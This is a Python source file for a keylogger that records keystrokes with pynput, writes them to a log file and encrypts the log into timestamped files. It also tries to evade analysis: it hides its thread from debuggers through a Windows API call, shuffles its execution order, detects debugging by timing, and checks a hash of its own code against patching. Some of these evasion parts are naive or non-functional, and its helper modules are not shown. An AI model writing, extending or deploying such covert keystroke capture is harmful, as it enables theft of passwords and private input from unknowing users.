import pynput
from pynput import keyboard
import base64
import requests
import os
import datetime
import ctypes
import random
import time
import hashlib

from config import *
from utils import *

log_file = 'key_log.txt'

key = "1234"

def hide_thread():
    thread_handle = ctypes.windll.kernel32.GetCurrentThread()
    ctypes.windll.kernel32.SetThreadInformation(
        thread_handle,
        0x11,
        ctypes.c_void_p(1),
        ctypes.sizeof(ctypes.c_void_p)
    )

def on_key_press(key):
    log_data = f"{datetime.datetime.now()} - {key}\n"
    with open(log_file, "a") as file:
        file.write(log_data)
    return True

def encrypt_log_file():
    encrypted_log = encrypt_file(log_file, encryption_key)
    encrypted_log_file = f"{log_directory}/encrypted_log_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    with open(encrypted_log_file, "wb") as file:
        file.write(encrypted_log)

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

def self_modify():
    code = """
def hidden_function():
    pass
"""
    local_vars = {}
    exec(code, globals(), local_vars)
    local_vars['hidden_function']()

def obfuscated_control_flow():
    steps = [step1, step2, step3]
    random.shuffle(steps)
    for step in steps:
        step()

def step1():
    start_time = time.time()
    listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    listener.start()
    listener.join()
    end_time = time.time()
    check_time(start_time, end_time)

def step2():
    start_time = time.time()
    encrypt_log_file()
    end_time = time.time()
    check_time(start_time, end_time)

def step3():
    start_time = time.time()
    hide_thread()
    self_modify()
    end_time = time.time()
    check_time(start_time, end_time)

def check_time(start_time, end_time):
    elapsed_time = end_time - start_time
    threshold = 20  # Adjust this threshold based on expected execution time
    if elapsed_time > threshold:
        print("Potential debugging detected!")
        # Handle the detection (e.g., exit the program, raise an alert, etc.)

def compute_hash(data):
    return hashlib.sha256(data.encode()).hexdigest()

def check_code_integrity():
    # Precomputed hash of the critical sections of your code
    precomputed_hash = "c971628932c9084addb5d118aaf7acddf92281477b24870c343e09782ee943f4"
    
    # Critical sections of your code
    critical_code = """
def on_key_press(key):
    log_data = f"{datetime.datetime.now()} - {key}\\n"
    with open(log_file, "a") as file:
        file.write(log_data)
    return True

def encrypt_log_file():
    encrypted_log = encrypt_file(log_file, encryption_key)
    encrypted_log_file = f"{log_directory}/encrypted_log_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    with open(encrypted_log_file, "wb") as file:
        file.write(encrypted_log)

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False
"""
    computed_hash = compute_hash(critical_code)
    if computed_hash != precomputed_hash:
        print("Code integrity check failed! Potential memory patching detected.")
        # Handle the detection (e.g., exit the program, raise an alert, etc.)

if __name__ == "__main__":
    check_code_integrity()
    obfuscated_control_flow()